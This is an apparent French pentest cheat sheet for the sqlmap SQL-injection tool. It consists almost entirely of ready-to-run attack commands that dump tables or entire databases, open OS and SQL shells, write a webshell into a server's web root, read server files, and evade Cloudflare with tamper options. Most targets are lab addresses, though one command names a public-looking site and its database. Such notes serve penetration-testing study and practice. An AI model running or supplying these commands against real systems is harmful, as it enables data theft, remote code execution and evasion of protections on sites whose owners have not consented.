# sqlmap

## pratique:

1. Faire un “copy to file” de la requete depuis burp ou Zap (avec headers+data)
2. sqlmap -r <fichier> -a --batch


## en GET

```sh
sqlmap -u "http://example.com/?a=1&b=2&c=3" -p "a,b"
```

## en POST

```sh
sqlmap -u "http://example.com/" --data "a=1&b=2&c=3" -p "a,b" --method POST
```  

## lister les tables:

```sh
sqlmap -u http://10.10.10.143/room.php?cod=1 -p "cod" --dbms=mysql --tables
```

## lister les tables d'une base

```sh
python sqlmap.py -u "http://www.site.com/section.php?id=51" --tables -D safecosmetics
```

## lister les colonne d'une tables:

```sh
python sqlmap.py -u "http://www.site.com/section.php?id=51" --columns -D safecosmetics -T users
```

## dumper une seule table:

```sh
sqlmap -u http://10.10.10.143/room.php?cod=1 -p "cod" --dbms=mysql -D 'mysql' -T 'user' --dump
```

## tout dumper

```sh
sqlmap -u http://10.10.10.10.... --dbms=mysql --dump-all
```

## dumper la base courante 

```sh
sqlmap -u http://10.10.10.10.... --dbms=mysql --dump
```

## from and by Burp 

```sh
--proxy=http://127.0.0.1:8080
```

## sqlmap crawl 

```sh
sqlmap -u http://10.10.10.10 --crawl=1
```

## sqlmap shell 

```sh
sqlmap -u http://10.10.10.10 --dbms=mysql --os-shell
```

## upload webshell

```sh
sudo sqlmap -r sqli_search_productName --file-write=webshell.php --file-dest=c:/inetpub/wwwroot/webshell.php --batch
```

## lire un fichier:

```sh
sqlmap -u http://127.0.0.1:1080/blog/single.php?id=* --level 5 --risk 3 --batch --file-read=/opt/lampp/htdocs/index.php
```

## checker les privs:

```sh
sqlmap -u 192.168.1.124/sqli/Less-1/?id=1 --privileges
```

## proxy

```sh
--temper pour le bypass de proxy
```

## Commande SQL:

```sh
sqlmap -u http://127.0.0.1:1080/blog/single.php?id=* --level 5 --risk 3 --batch --dbms=mysql --sql-shell

sql-shell> SELECT * FROM blogs
```

## sous windows:

1. télécharger le [projet](https://github.com/sqlmapproject/sqlmap) et lancer: python ./sqlmap.py

```powershell
python.exe .\sqlmap.py -r ..\VLA-auth-login.raw -a --batch
```

## cloudflare bypaass

```powershell
python.exe .\sqlmap.py -r .\question.raw --batch tamper="between,randomcase,space2comment" --random-agent
```

## Quick and Dirty A NE PAS FAIRE EN PROD

```Powershell
python.exe .\sqlmap.py -r ..\VLA-auth-login.raw -a --batch --level 5 --risk 3 --proxy=http://127.0.0.1:8080 --flush-session
```